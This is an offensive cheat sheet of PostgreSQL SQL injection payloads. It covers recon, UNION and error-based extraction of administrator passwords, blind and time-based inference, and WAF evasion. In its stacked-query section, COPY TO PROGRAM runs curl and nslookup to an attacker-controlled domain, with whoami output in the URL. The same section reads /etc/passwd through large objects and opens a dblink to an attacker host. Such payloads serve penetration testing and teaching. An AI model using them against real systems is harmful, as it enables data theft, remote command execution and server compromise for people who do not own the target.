# PostgreSQL — SQL Injection Exploitation Cheat Sheet
 
## 1. Fingerprinting & Environment Recon
 
```sql
-- Version
SELECT version();
 
-- Current user / privilege context
SELECT current_user;
SELECT session_user;
SELECT user;
 
-- Current database
SELECT current_database();
 
-- Hostname / server info
SELECT inet_server_addr();
SELECT inet_server_port();
 
-- Privilege checks
SELECT usesuper FROM pg_user WHERE usename = current_user;
SELECT rolsuper FROM pg_roles WHERE rolname = current_user;
SELECT rolcreatedb, rolcreaterole FROM pg_roles WHERE rolname = current_user;
 
-- Installed extensions (relevant to OOB/file/RCE primitives further down)
SELECT extname FROM pg_extension;
 
-- Data directory (typically requires superuser to read)
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```
 
## 2. Syntax & Comment Dialects
 
```sql
-- Inline comment
' AND 1=1--
 
-- Multi-line comment (PostgreSQL supports NESTED block comments, unlike most DBMSs)
' AND/*comment*/1=1
' AND /* outer /* inner */ still a comment */ 1=1
 
-- String concatenation
SELECT username || ':' || password FROM users;
SELECT concat(username,':',password) FROM users;
SELECT concat_ws(':',username,password) FROM users;
```
 
**No dummy table required** — `SELECT 'abc','def'` is valid with no `FROM` clause.
 
## 3. Schema & Metadata Enumeration
 
```sql
-- List every database on the server
SELECT datname FROM pg_database;
 
-- List schemas
SELECT schema_name FROM information_schema.schemata;
 
-- List tables in the public schema
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';
SELECT tablename FROM pg_tables WHERE schemaname = 'public';
 
-- List columns of a specific table
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
 
-- Row-folding: dump an entire table into a single reflected value
-- STRING_AGG has no built-in length cap comparable to MySQL's group_concat_max_len
SELECT STRING_AGG(username || ':' || password, ',') FROM users;
 
-- Array-based alternative (functionally equivalent, useful if STRING_AGG is unavailable
-- on older PostgreSQL versions — STRING_AGG requires 9.0+)
SELECT array_to_string(array_agg(username || ':' || password), ',') FROM users;
```
 
## 4. In-Band Exploitation (UNION & Error-Based)
 
```sql
-- NULL probing for column count
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
 
-- PostgreSQL enforces STRICT type matching per column position — a NULL that matches
-- fine structurally may still need an explicit cast if the application wraps the
-- result (e.g., in further string processing):
' UNION SELECT NULL,(SELECT version())::text,NULL--
 
-- Error-based extraction via CAST type-conversion failure
' AND CAST((SELECT version()) AS int)--
' AND CAST((SELECT current_database()) AS int)--
' AND 1=CAST((SELECT password FROM users WHERE username='administrator' LIMIT 1) AS int)--
 
-- Conditional induced error (division by zero), mirroring Oracle's CASE/TO_CHAR pattern
' AND (SELECT CASE WHEN (1=1) THEN CAST(1/0 AS int) ELSE 1 END)--
' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN CAST(1/0 AS int) ELSE 1 END FROM users WHERE username='administrator')--
```
 
## 5. Blind & Inferential Payloads
 
```sql
-- Boolean-based
' AND 1=1--
' AND 1=2--
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>109--
 
-- Conditional logic (PostgreSQL has no inline IF() expression — CASE WHEN is mandatory
-- outside of PL/pgSQL procedural code)
' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--
 
-- Time-based
' AND (SELECT pg_sleep(5))--
' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
 
-- Fractional-second variant (pg_sleep accepts a float)
' AND (SELECT pg_sleep(0.5))--
 
-- Heavy-query alternative to pg_sleep (useful if pg_sleep is filtered/disabled)
' AND (SELECT COUNT(*) FROM generate_series(1,5000000))--
```
 
## 6. Stacked Queries & Out-of-Band (OAST)
 
```
Stacked query support: GENERALLY AVAILABLE. PostgreSQL's simple query protocol
(used by most libpq-based drivers and frameworks by default) accepts multiple
semicolon-separated statements in a single call — stacked queries are viable far
more often on PostgreSQL than on MySQL. Always confirm empirically per target.
```
 
```sql
-- File write via COPY TO (requires superuser or the pg_write_server_files role)
x';COPY (SELECT '') TO '/tmp/pwned';--
 
-- RCE / OOB via COPY TO PROGRAM (PostgreSQL 9.3+; requires superuser or
-- pg_execute_server_program role) — the single most powerful OOB/RCE primitive
-- available on PostgreSQL
x';COPY (SELECT '') TO PROGRAM 'nslookup attacker-controlled-domain';--
x';COPY (SELECT '') TO PROGRAM 'curl http://attacker-controlled-domain/$(whoami)';--
 
-- File read/write via large objects (lo_import/lo_export)
x';SELECT lo_import('/etc/passwd', 12345);--
x';SELECT lo_export(12345, '/tmp/exfiltrated_passwd');--
 
-- Outbound network OOB via the dblink extension (requires dblink installed/available)
x';SELECT * FROM dblink('host=attacker-controlled-domain port=5432 dbname=x user=y password=z','select 1') AS t(x int);--
```
 
## 7. WAF Evasion & DBMS-Specific Quirks
 
```sql
-- Whitespace alternatives
' UNION%0aSELECT%0a1,2,3--
' UNION%09SELECT%091,2,3--
' UNION/**/SELECT/**/1,2,3--
' UNION(SELECT(1),(2),(3))--
 
-- Nested comment obfuscation (PostgreSQL-specific; most other DBMSs error on this)
' UNION/*a/*b*/c*/SELECT 1,2,3--
 
-- Case variation
' uNiOn SeLeCt 1,2,3--
 
-- Dollar-quoted string literals — bypasses filters that specifically block the
-- single-quote character, since dollar-quoting requires no quote character at all
SELECT $$admin$$;
' AND username=$$administrator$$--
 
-- Quote-free string construction via chr() and concatenation
SELECT chr(97)||chr(100)||chr(109)||chr(105)||chr(110);   -- builds 'admin' with zero literal quotes
```
 
